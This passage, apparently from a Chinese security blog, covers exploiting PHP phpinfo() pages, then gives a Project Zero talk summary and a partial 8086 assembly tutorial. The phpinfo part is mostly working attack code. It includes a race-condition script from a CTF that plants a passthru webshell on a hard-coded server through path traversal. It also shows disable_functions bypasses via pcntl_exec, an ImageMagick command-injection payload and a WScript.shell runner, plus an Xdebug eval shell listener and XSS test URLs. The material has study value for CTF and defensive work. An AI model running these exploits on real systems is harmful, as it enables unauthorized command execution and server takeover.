class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit </div><div class="line"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</div><div class="line"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</div><div class="line"></div><div class="line">## passwords.txt payload content</div><div class="line"># &lt;?php $c=fopen('/app/intrd','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</div><div class="line"></div><div class="line">import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line">from subprocess import Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=50</div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line">class checkHash(threading.Thread):</div><div class="line">def __init__(self,queue):</div><div class="line">threading.Thread.__init__(self)</div><div class="line">self.queue=queue</div><div class="line">def run(self):</div><div class="line">i=0</div><div class="line">while True:</div><div class="line">self.clear=self.queue.get()</div><div class="line">passtry = self.clear</div><div class="line">if passtry != "":</div><div class="line"></div><div class="line">padding="A" * 5000</div><div class="line"></div><div class="line">cookies = &#123;</div><div class="line">    'PHPSESSID': 'o99quh47clk8br394298tkv5o0',</div><div class="line">    'othercookie': padding</div><div class="line">&#125;</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    'User-Agent': padding,</div><div class="line">    'Pragma': padding,</div><div class="line">    'Accept': padding,</div><div class="line">    'Accept-Language': padding,</div><div class="line">    'DNT': '1'</div><div class="line">&#125;</div><div class="line"></div><div class="line">files = &#123;'arquivo': open('passwords.txt','rb')&#125;</div><div class="line"></div><div class="line">reqs='http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</div><div class="line">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</div><div class="line">response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)</div><div class="line">data = response.content</div><div class="line">data = re.search(r"(?&lt;=tmp_name] =&amp;gt; ).*", data).group(0)</div><div class="line">print data</div><div class="line"></div><div class="line">reqs = 'http://47.97.221.96:23333/index.php?action=../..'+data</div><div class="line">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</div><div class="line">print reqs</div><div class="line">response = requests.get(reqs, verify=False)</div><div class="line">data = response.content</div><div class="line">print data</div><div class="line"></div><div class="line">i+=1</div><div class="line">self.queue.task_done()</div><div class="line"></div><div class="line">for i in range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(True)</div><div class="line">    t.start()</div><div class="line"></div><div class="line">for x in range(0, 9999):</div><div class="line">x=str(x)</div><div class="line">queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure></p><p>参考:<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p><h2 id="0x02-重要配置"><a href="#0x02-重要配置" class="headerlink" title="0x02 重要配置"></a>0x02 重要配置</h2><h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><p>远程文件包含，但是一般不会开启</p><h3 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png" alt="image"></p><p>php标签有4种形式，如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的。</p><p>这里有一篇<code>user.ini</code>+<code>asp_tags</code>绕过的文章 <a href="https://www.math1as.com/index.php/archives/468/" target="_blank" rel="external">针对内容(php tags)检测的一种绕过思路</a></p><p>实际就是通过向其中添加<code>php_value asp_tags On</code>并上传<code>.htaccess</code>和<code>.user.ini</code>来bypass。</p><p>原理，asp_tags的属性是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改</div></pre></td></tr></table></figure><p>注意： 在PHP 7已经完全移除了这种标签</p><h3 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a>short_open_tag</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/h4bGaFaceD.png" alt="image"><br>还是标签的问题，允许&lt;??&gt;这种形式，并且&lt;?=等价于&lt;? echo</p><h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/mF8ekJH0mJ.png" alt="image"><br>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><p>绕过的方式有这么几个：</p><p>1.黑名单绕过<br>百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。</p><p>比如有时候没有禁用proc_open</p><p>比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。</p><p>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> pcntl_exec(“/bin/bash”, <span class="keyword">array</span>(“/tmp/b4dboy.sh”));<span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><a href="http://secoff.net/archives/116.html" target="_blank" rel="external">渗透技巧：利用pcntl_exec突破disable_functions</a></p><p>2.利用扩展（如ImageMagick）绕过<br><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="external">利用ImageMagick漏洞绕过disable_function</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">$command = PHP_SAPI == <span class="string">'cli'</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">'cmd'</span>];</div><div class="line"><span class="keyword">if</span> ($command == <span class="string">''</span>) &#123;</div><div class="line">    $command = <span class="string">'id'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</div><div class="line">pop graphic-context</div><div class="line">EOF;</div><div class="line"></div><div class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</div><div class="line">$thumb = <span class="keyword">new</span> Imagick();</div><div class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</div><div class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</div><div class="line">$thumb-&gt;clear();</div><div class="line">$thumb-&gt;destroy();</div><div class="line">unlink(<span class="string">"KKKK.mvg"</span>);</div><div class="line">unlink(<span class="string">"KKKK.png"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="https://www.waitalone.cn/wp-content/uploads/2016/05/20160510040129174.jpg" alt="image"></p><p>3.<a href="http://www.vuln.cn/6784" target="_blank" rel="external">利用环境变量LD_PRELOAD来绕过php disable_function</a></p><p>4.利用扩展库绕过</p><p><strong>Windows靠系统组件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$command=$_POST[a];</div><div class="line"></div><div class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象</span></div><div class="line"></div><div class="line">$exec = $wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.$command);  <span class="comment">//调用对象方法来执行命令</span></div><div class="line"></div><div class="line">$stdout = $exec-&gt;StdOut();</div><div class="line"></div><div class="line">$stroutput = $stdout-&gt;ReadAll();</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $stroutput</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>Linux下可通过编译拓展库进行绕过</strong></p><p><a href="http://www.91ri.org/8700.html" target="_blank" rel="external">Webshell下命令执行限制及绕过方法</a></p><h3 id="enable-dl"><a href="#enable-dl" class="headerlink" title="enable_dl"></a>enable_dl</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/8k74AiDbJ9.png" alt="image"><br>上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</p><h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png" alt="image"><br>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png" alt="image"><br>这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。</p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="external">php5全版本绕过open_basedir读文件脚本</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="external">绕过open_basedir读文件脚本</a></p><h2 id="0x03扩展"><a href="#0x03扩展" class="headerlink" title="0x03扩展"></a>0x03扩展</h2><h3 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h3><p>前段时间影响比较大的漏洞，注意看版本。</p><p>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。</p><p><a href="http://blog.topsec.com.cn/ad_lab/imagemagick-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%88%86%E6%9E%90/" target="_blank" rel="external">ImageMagick 漏洞利用方式及分析</a></p><p><a href="http://www.jianshu.com/p/502e39c122e6" target="_blank" rel="external">ImageMagick远程执行漏洞分析及利用</a></p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h3><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="external">Memcache未授权访问漏洞利用及修复</a></p><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="external">利用redis写webshell</a></p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>1.序列化的一些问题<br><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170912/7g4402ghe1.png" alt="image"><br>序列化处理器不一致导致对象注入</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p><p>具体可以看另一篇文章<a href="http://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="external">php对象注入总结</a>。</p><p>2.session.upload_progress加本地文件包含=getshell</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a></p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>xdebug命令执行</p><p><a href="https://paper.seebug.org/397/" target="_blank" rel="external">Xdebug: A Tiny Attack Surface</a></p><p><a href="https://paper.seebug.org/668/" target="_blank" rel="external">Xdebug 攻击面在 PhpStorm 上的现实利用</a></p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</div><div class="line">sk = socket.socket()</div><div class="line">sk.bind(ip_port)</div><div class="line">sk.listen(<span class="number">10</span>)</div><div class="line">conn, addr = sk.accept()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    client_data = conn.recv(<span class="number">1024</span>)</div><div class="line">    print(client_data)</div><div class="line"></div><div class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    conn.sendall(<span class="string">'eval -i 1 -- %s\x00'</span> % data.encode(<span class="string">'base64'</span>))</div></pre></td></tr></table></figure><h3 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h3><p>主要在ssrf中使用</p><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面</a></p><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="external">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><h2 id="0x04其它"><a href="#0x04其它" class="headerlink" title="0x04其它"></a>0x04其它</h2><h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>php不存在缓存文件，但是其有opcache，如果有文件上传就可以进行覆盖并getshell</p><h3 id="‘act-’问题"><a href="#‘act-’问题" class="headerlink" title="‘act=’问题"></a>‘act=’问题</h3><p>测试版本：PHP Version 5.6.22:<br>发掘方法：右键源代码搜索：act= </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http-sql-inject：http://target/phpinfo.php?act=Function</div><div class="line">xss：http://target/phpinfo.php/&apos;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div><div class="line">csrf或跨域名点击劫持:http://target/phpinfo.php#bottom#fghj#dfghjk </div><div class="line">xss:http://target/phpinfo.php?act=rt&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure><h3 id="域-amp-用户"><a href="#域-amp-用户" class="headerlink" title="域&amp;用户"></a>域&amp;用户</h3><p>phpinfo页面还能看到当前域，当前登录用户</p><p>工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></p><p>参考</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>project zero talk note</title>
      <link href="/2018/11/12/pz-talk-note/"/>
      <url>/2018/11/12/pz-talk-note/</url>
      <content type="html"><![CDATA[<h2 id="0x01-定位"><a href="#0x01-定位" class="headerlink" title="0x01 定位"></a>0x01 定位</h2><p>任务:让0day更难</p><p>工作:</p><ul><li>漏洞研究</li><li>exploit开发</li><li>缓解设计和审查</li></ul><h2 id="0x02-Project-Zero如何找bug"><a href="#0x02-Project-Zero如何找bug" class="headerlink" title="0x02 Project Zero如何找bug"></a>0x02 Project Zero如何找bug</h2><h3 id="1-我应该从哪儿找？"><a href="#1-我应该从哪儿找？" class="headerlink" title="1.我应该从哪儿找？"></a>1.我应该从哪儿找？</h3><ul><li>优先级。 攻击者会在哪里看？重视单个研究人员的经验+专业知识</li><li>找到新的攻击面，或迭代已知的攻击面。</li></ul><h3 id="2-我应该怎么找？-也就是怎么找到一个切入角度"><a href="#2-我应该怎么找？-也就是怎么找到一个切入角度" class="headerlink" title="2.我应该怎么找？  也就是怎么找到一个切入角度"></a>2.我应该怎么找？  也就是怎么找到一个切入角度</h3><ul><li>选择处理不可信数据的输入点并找到其bugs。</li><li>选择一个bug类来查找实例。</li><li>选择一个功能/规范，找出不同实现中的常见缺陷。</li><li>查找已知问题的变形。</li></ul><h3 id="3-CVE-2018-10751"><a href="#3-CVE-2018-10751" class="headerlink" title="3.CVE-2018-10751"></a>3.CVE-2018-10751</h3><ul><li>三星Galaxy S7 Edge中的OMACP溢出–由短信触发</li><li>通过寻找处理SMS的Intent找到</li><li>一年前，Contextis报道了一个类似的错误</li></ul><h3 id="4-Fuzzing"><a href="#4-Fuzzing" class="headerlink" title="4.Fuzzing"></a>4.Fuzzing</h3><p>Canonical mutation fuzzing(大概意思是利用经典数据的变种来进行fuzz)：语料库创建，参数优化，模糊测试，覆盖反馈，崩溃分析。</p><p>自定义模糊测试，如定制生成器或文件格式突变感知。</p><h3 id="5-手动审查"><a href="#5-手动审查" class="headerlink" title="5.手动审查"></a>5.手动审查</h3><p>有时是线性的：枚举函数列表并前向分析。</p><p>有时横向：找到一些脆弱属性的实例（错误类，重复错误，非标准模式），稍后建立“触发点”。</p><h2 id="0x03-对未来的预测"><a href="#0x03-对未来的预测" class="headerlink" title="0x03 对未来的预测"></a>0x03 对未来的预测</h2><ol><li>手动分析方式不会改变</li><li>基本模糊测试结果不会很好</li><li>代码覆盖率反语料库推动新工作</li><li>静态分析对VR来说效率仍然不高</li></ol>]]></content>
      
      
    </entry>
    
    <entry>
      <title>汇编笔记</title>
      <link href="/2018/11/11/assembly-note/"/>
      <url>/2018/11/11/assembly-note/</url>
      <content type="html"><![CDATA[<h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><h3 id="0-汇编基础"><a href="#0-汇编基础" class="headerlink" title="0.汇编基础"></a>0.汇编基础</h3><p>能够被计算机直接识别的语言称之为机器语言，比如:<code>00100000</code>这种的，汇编语言是需要通过编译器转变为机器语言的。</p><p>计算机构成:输入/输出设备、存储器、运算器、控制器</p><h3 id="1-基础单位信息"><a href="#1-基础单位信息" class="headerlink" title="1.基础单位信息"></a>1.基础单位信息</h3><p>bit=位 1/0 计算机最小信息单位</p><p>Byte=字节=8bit=B=1个存储单元 计算机最小存储单位</p><p>字(word)=2B=2byte </p><p>存储地址和存储内容一般用16进制表示</p><p>0x..或者H=十六进制(0,F)  B=二进制(0,1) D=十进制(0,9)</p><h3 id="2-CPU对存储器的读写"><a href="#2-CPU对存储器的读写" class="headerlink" title="2.CPU对存储器的读写"></a>2.CPU对存储器的读写</h3><p>ROM=&gt;BOIS芯片</p><p>CPU通过地址总线寻址、数据总线传输数据、控制总线进行操作来完成一些处理。</p><p>地址对应的是数据，因此地址总线的宽度也就是其一次最大能寻找到多少个字节的数据。</p><p>不同CPU的寄存器个数是不同的，但是都有通用寄存器</p><h3 id="3-寄存器"><a href="#3-寄存器" class="headerlink" title="3.寄存器"></a>3.寄存器</h3><p>概念:CPU中程序员可以用指令读写的部件，寄存器数量有限(8086中有14个寄存器)，读写速度快。</p><p><a href="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" alt="屏幕快照 2018-11-08 下午9.17.52.png"></a></p><p>内存单元是一个单元存放一个字节(8位二进制)</p><blockquote><p>通用寄存器可用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。除此之外，它们还各自具有一些特殊功能。</p></blockquote><p>数据是不能直接送入段地址寄存器(DS)中的;</p><p>16位寄存器可以拆分为两个8位寄存器进行使用;</p><p><code>mov a1,[0]</code>，此处的[]说明操作的是一个内存单元，[0]中的0说明这个内存单元的偏移地址是0，它的段地址默认放在ds寄存器中，使用时会被去出来。</p><p>PS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">累加寄存器在不同位计算机中的名字不同</div><div class="line">16位-AX</div><div class="line">32位-EAX</div><div class="line">64位-RAX</div></pre></td></tr></table></figure><p>16位数据寄存器不能存放数据地址，但是32位的可以</p><h5 id="3-1-数据寄存器"><a href="#3-1-数据寄存器" class="headerlink" title="3.1 数据寄存器"></a>3.1 数据寄存器</h5><p><a href="https://i.loli.net/2018/11/08/5be4384f283cd.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/08/5be4384f283cd.png" alt="屏幕快照 2018-11-08 下午9.21.03.png"></a></p><h5 id="3-2-标志寄存器"><a href="#3-2-标志寄存器" class="headerlink" title="3.2 标志寄存器"></a>3.2 标志寄存器</h5><p><a href="https://i.loli.net/2018/11/09/5be59269c31cf.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/09/5be59269c31cf.png" alt="屏幕快照 2018-11-09 下午8.54.44.png"></a></p><h6 id="3-2-1运算结果标志位"><a href="#3-2-1运算结果标志位" class="headerlink" title="3.2.1运算结果标志位"></a>3.2.1运算结果标志位</h6><p><strong>ZF标志（ZeroFlag</strong>）：</p><p>零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，如果结果不为0，那么ZF=0。</p><p><strong>PF标志（ParityFlag</strong>）：</p><p>奇偶标志位，它记录相关指令执行后，其结果的所有二进制位中1个个数是否为偶数，如果是偶数，PF=1，反之为0。</p><p><strong>SF标志（SignFlag</strong>）：</p><p>符号标志位，它记录相关指令执行后，其结果是否为负，如果结果为负，SF=1，如果非负，SF=0。</p><p><strong>CF标志（Carry进位，Flag标志</strong>）：</p><p>进位标志位，一般情况，进行无符号运算时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或借位，那么其值为1，否则其值为0。</p><p><strong>OF标志（Overflow溢出，Flag标志）</strong>：</p><p>溢出标志位，在进行有符号数运算的时候，如果结果超出了机器所能表示的范围称为溢出，OF的值被置为1，否则OF的值为0。</p><p>注意：这里所说的溢出，只是对有符号运算而言。</p><h6 id="3-2-2状态控制标志位"><a href="#3-2-2状态控制标志位" class="headerlink" title="3.2.2状态控制标志位"></a>3.2.2状态控制标志位</h6><p><strong>TF标志（TrapFlag）</strong>：</p><p>追踪标志位，当追踪标志被置为1时，CPU进入单步执行方式，即每执行一条指令产生一个单步中断请求，这中方式主要用于程序的调试。</p><p><strong>IF标志（Interrupt-enable Flag</strong>）：</p><p>中断允许标志位，用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求，但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。</p><p>当IF=1时，CPU可以相应CPU外部的可屏蔽中断发出的中断请求。</p><p>当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。</p><p>CPU的指令系统中也有专门的指令来改变标志位IF的值。</p><h3 id="4-物理地址"><a href="#4-物理地址" class="headerlink" title="4.物理地址"></a>4.物理地址</h3><p>通常文件中至少含有两个段:代码段(存储程序的指令–可读，不可写，可执行)、数据段(存储需要的数据的指令–可读，可写，可执行)</p><p>二进制左移N位相当于这个二进制数乘以2的N次方</p><p>物理地址=段地址*16(又称基址)+偏移地址</p><p>任何时刻8086CPU都会将CS:IP指向的内容作为即将执行的指令(可以使用<code>jmp</code>对其进行修改操作)</p><p>一个物理地址可以对应多个逻辑地址，在编程的时候使用的是逻辑地址(=段基地址+段内偏移地址)</p><h3 id="5-段地址"><a href="#5-段地址" class="headerlink" title="5.段地址"></a>5.段地址</h3><p><a href="https://i.loli.net/2018/11/08/5be43c4837204.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/08/5be43c4837204.png" alt="屏幕快照 2018-11-08 下午9.38.04.png"></a></p><p>可以将若干地址连续的内存单元看做一个段</p><p>8086CPU有4个段寄存器，每个段寄存器用来确定一个逻辑段的起始位置，每种逻辑段均有各自的用途：</p><p> CS（代码段）：指明代码的起始地址</p><pre><code>利用CS：IP取得下一条要执行的指令</code></pre><p> SS（堆栈段）：指明堆栈段的起始地址</p><pre><code>利用SS：SP操作堆栈顶的数据</code></pre><p> DS（数据段）：指明数据的起始地址</p><pre><code>利用DS：EA存取数据段中的数据</code></pre><p> ES（附加段）：指明附加段的起始地址</p><pre><code>利用ES：EA存取附加段中的数据</code></pre><p>PS:</p><p>1.在内存中，指令和数据没有任何区别，都是而二进制信息，只是CPU将有的数据看成指令，有的看成数据</p><p>2.一般的寄存器，如AX，可以使用<code>mov ax,123</code>来完成对其中数值的修改。但是像CS,IP这样的寄存器(用来从内存中寻址执行指令的)只能使用转移指令来修改，比如jmp–<code>jum [段地址:]偏移地址</code>，段地址和’:’缺省将只修改IP的值</p><p>3.操作中如果没有指明段前缀，则一般访问的是DS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov ax,[1000H]</div><div class="line">;这两行都是等价的</div><div class="line">mov ax,ds:[1000H]</div></pre></td></tr></table></figure><h3 id="6-mov-add-sub指令"><a href="#6-mov-add-sub指令" class="headerlink" title="6.mov,add,sub指令"></a>6.mov,add,sub指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">mov 寄存器,数据</div><div class="line">比如:</div><div class="line">mov ax,8</div><div class="line">mov 寄存器，寄存器</div><div class="line">比如:</div><div class="line">mov ax,bx</div><div class="line">mov 寄存器，内存单元</div><div class="line">比如:</div><div class="line">mov ax,[0]</div><div class="line">mov 内存单元，寄存器</div><div class="line">比如:</div><div class="line">mov [0],ax</div><div class="line">mov 段寄存器，寄存器 //相反也对</div><div class="line">比如:</div><div class="line">mov ds,ax</div></pre></td></tr></table></figure><p>关于mov的操作对象的说明:<br><a href="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" alt="屏幕快照 2018-11-11 下午4.59.54.png"></a></p><p>PS:</p><p>指令=操作码(+操作数)</p><h3 id="7-栈-后入先出"><a href="#7-栈-后入先出" class="headerlink" title="7.栈(后入先出)"></a>7.栈(后入先出)</h3><p>两个关键寄存器:SS,SP-&gt;段地址,段偏移地址。这对寄存器将会指出栈顶地址。栈大小由我们自己安排所以要小心超界问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mov ax,0123H</div><div class="line">psuh ax</div><div class="line">mov bx,2266H</div><div class="line">push bx</div><div class="line">pop ax //2266H</div><div class="line">pop bx //0123H</div></pre></td></tr></table></figure><p>PS:</p><p>堆栈操作都是以字(2字节)为单位操作的。</p><h3 id="8-开发环境配置"><a href="#8-开发环境配置" class="headerlink" title="8.开发环境配置"></a>8.开发环境配置</h3><p>win7及以上系统都没有debug了，所以都需要这个DOSBOX</p><p><a href="https://www.cnblogs.com/skyen/p/9721471.html" target="_blank" rel="external">MAC OS环境下DOSBOX汇编环境的搭建</a></p><h3 id="9-debug"><a href="#9-debug" class="headerlink" 